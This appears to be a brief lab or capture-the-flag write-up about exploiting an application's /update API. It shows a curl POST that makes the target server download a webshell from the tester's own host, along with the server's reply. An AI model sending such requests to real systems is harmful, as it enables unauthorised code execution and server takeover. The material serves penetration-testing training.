

# Sending Request

---

Moving onto the /update API endpoint, the API Index on the website provides us with an template.

```
/update

Methods: POST

Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}
```

## PoC

Sent an request to the server, so the server sends an request as user "clumsyadmin" to my server, which will download my webshell script.

Note: 

We have to specify --data when sending .json input.
We have to specify -H when trying to specify the Content-Type to .json

```
curl -X POST http://192.168.237.134:13337/update -H "Content-Type: application/json" --data '{"user":"clumsyadmin","url":"http://192.168.45.164/wolfswebshell.php"}'
Update requested by clumsyadmin. Restart the software for changes to take effect.
```
